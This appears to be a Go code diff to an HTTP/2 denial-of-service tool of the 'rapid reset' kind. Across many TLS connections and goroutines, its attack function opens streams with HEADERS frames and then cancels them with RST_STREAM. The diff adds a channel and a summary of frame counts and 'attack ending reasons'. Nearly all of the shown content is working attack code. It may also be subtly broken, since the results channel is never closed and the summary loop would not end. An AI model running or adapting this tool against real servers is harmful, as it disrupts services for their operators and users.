@@ -4,9 +4,10 @@ import (
 	"bytes"
 	"crypto/tls"
 	"flag"
+	"fmt"
 	"log"
 	"net/url"
-	"sync"
+	"strings"
 	"sync/atomic"
 	"time"
 
@@ -15,8 +16,13 @@ import (
 )
 
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+const (
+	TIMEOUT = iota
+	GOAWAY
+	ERR
+)
 
-type ReadFrameResult struct {
+type ResultData struct {
 	Headers      uint32
 	GoAway       uint32
 	Data         uint32
@@ -25,6 +31,18 @@ type ReadFrameResult struct {
 	Ping         uint32
 	Unknown      uint32
 	RSTStream    uint32
+}
+
+type ReadFrameResult struct {
+	ResultData
+	Err int
+}
+
+type ReadFrameSummary struct {
+	ResultData
+	GoAwayEvents  uint32
+	TimeoutEvents uint32
+	ErrorEvents   uint32
 }
 
 var attempts = flag.Uint("attempts", 1, "maximum attempts per routine")
@@ -66,17 +84,59 @@ func main() {
 		NextProtos:         []string{"h2"},
 	}
 
-	var wg sync.WaitGroup
+	ch := make(chan ReadFrameResult, *connections)
 	for i := 0; i < *connections; i++ {
-		wg.Add(1)
-		go execute(serverUrl, conf, &wg)
+		log.Printf("create connection %d", i)
+		go execute(serverUrl, conf, ch)
 	}
-	wg.Wait()
+
+	var summary ReadFrameSummary
+	for rfr := range ch {
+		log.Printf("%v", rfr)
+		summary = sum(rfr, summary)
+	}
+	summarize(summary)
 }
 
-func execute(serverUrl *url.URL, conf *tls.Config, wg *sync.WaitGroup) {
-	defer wg.Done()
+func summarize(summary ReadFrameSummary) {
+	fmt.Println(strings.Repeat("#", 20) + "SUMMARY" + strings.Repeat("#", 20))
+	fmt.Println("Packet types received:")
+	fmt.Printf("\t PING: %d\n", summary.Ping)
+	fmt.Printf("\t HEADERS: %d\n", summary.Headers)
+	fmt.Printf("\t SETTINGS: %d\n", summary.Settings)
+	fmt.Printf("\t DATA: %d\n", summary.Data)
+	fmt.Printf("\t GOAWAY: %d\n", summary.GoAway)
+	fmt.Printf("\t RSTSTREAM: %d\n", summary.RSTStream)
+	fmt.Printf("\t WINDOWUPDATE: %d\n", summary.WindowUpdate)
+	fmt.Printf("\t UNKNOWN: %d\n", summary.Unknown)
+	fmt.Println("Attack ending reasons (per receiving thread):")
+	fmt.Printf("\t GoAway events: %d\n", summary.GoAwayEvents)
+	fmt.Printf("\t Timeout events: %d\n", summary.TimeoutEvents)
+	fmt.Printf("\t Error events: %d\n", summary.ErrorEvents)
+}
 
+func sum(result ReadFrameResult, summary ReadFrameSummary) ReadFrameSummary {
+	var errs [3]uint32
+	errs[result.Err] = 1
+
+	return ReadFrameSummary{
+			ResultData: ResultData {
+			Data:          result.Data + summary.Data,
+			GoAway:        result.GoAway + summary.GoAway,
+			Ping:          result.Ping + summary.Ping,
+			Unknown:       result.Unknown + summary.Unknown,
+			Headers:       result.Headers + summary.Headers,
+			WindowUpdate:  result.WindowUpdate + summary.WindowUpdate,
+			Settings:      result.Settings + summary.Settings,
+			RSTStream:     result.RSTStream + summary.RSTStream,
+		},
+		TimeoutEvents: errs[0] + summary.TimeoutEvents,
+		GoAwayEvents:  errs[1] + summary.GoAwayEvents,
+		ErrorEvents:   errs[2] + summary.ErrorEvents,
+	}
+}
+
+func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult) {
 	conn, err := tls.Dial("tcp", serverUrl.Host, conf)
 	if err != nil {
 		log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
@@ -117,11 +177,11 @@ func execute(serverUrl *url.URL, conf *tls.Config, wg *sync.WaitGroup) {
 	streamCounter.Add(1)
 	for i := 0; i < *routines; i++ {
 		streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
-		go attack(streamFramer, serverUrl, *attempts, &streamCounter, sleep)
+		go attack(streamFramer, serverUrl, &streamCounter)
 	}
-	readFrames(conn)
-	conn.Close()
+	ch <- readFrames(conn)
 
+	conn.Close()
 }
 
 func readFrames(conn *tls.Conn) ReadFrameResult {
@@ -134,36 +194,38 @@ func readFrames(conn *tls.Conn) ReadFrameResult {
 		frame, err := framer.ReadFrame()
 		if err != nil {
 			log.Printf("error reading response frame: %v", err)
+			rfr.Err = ERR
 			return rfr
 		}
 		log.Printf("found new frame headers: %v", frame.Header())
 
 		switch frame.Header().Type {
-			case http2.FrameHeaders:
-				rfr.Headers++
-			case http2.FrameSettings:
-				rfr.Settings++
-			case http2.FrameData:
-				rfr.Data++
-			case http2.FrameGoAway:
-				rfr.GoAway++
-				if *ignoreGoAway {
-					return rfr
-				}
-			case http2.FramePing:
-				rfr.Ping++
-			case http2.FrameRSTStream:
-				rfr.RSTStream++
-			case http2.FrameWindowUpdate:
-				rfr.WindowUpdate++
-			default:
-				rfr.Unknown++
+		case http2.FrameHeaders:
+			rfr.Headers++
+		case http2.FrameSettings:
+			rfr.Settings++
+		case http2.FrameData:
+			rfr.Data++
+		case http2.FrameGoAway:
+			rfr.GoAway++
+			if !*ignoreGoAway {
+				rfr.Err = GOAWAY
+				return rfr
+			}
+		case http2.FramePing:
+			rfr.Ping++
+		case http2.FrameRSTStream:
+			rfr.RSTStream++
+		case http2.FrameWindowUpdate:
+			rfr.WindowUpdate++
+		default:
+			rfr.Unknown++
 		}
 	}
 }
 
-func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter *atomic.Uint32, sleepTime *int) {
-	for i := uint(0); i < attempts; i++ {
+func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32) {
+	for i := uint(0); i < *attempts; i++ {
 		streamId := streamCounter.Load()
 		streamCounter.Add(2)
 		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
@@ -172,8 +234,8 @@ func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter *at
 		}
 		log.Printf("sent initial headers on stream %d", streamId)
 
-		log.Printf("now sleeping for %d milliseconds", *sleepTime)
-		time.Sleep(time.Millisecond * time.Duration(*sleepTime))
+		log.Printf("now sleeping for %d milliseconds", *sleep)
+		time.Sleep(time.Millisecond * time.Duration(*sleep))
 
 		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
 		if err != nil {
